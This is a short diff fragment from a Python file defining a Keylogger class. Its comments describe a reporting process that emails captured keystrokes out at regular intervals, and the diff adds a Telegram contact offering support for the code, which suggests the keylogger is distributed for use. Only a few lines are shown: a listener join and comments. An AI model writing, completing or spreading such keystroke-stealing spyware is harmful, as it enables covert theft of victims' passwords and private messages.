@@ -71,3 +71,5 @@ class Keylogger:
             # Starting the reporting process, which sends emails containing the captured keystrokes at regular intervals
             keyboard_listener.join()  
             # Blocking the main thread until the keyboard listener is stopped
+#For any problems with the code, you can contact us via Telegram
+#https://web.telegram.org/k/#@Lion20021
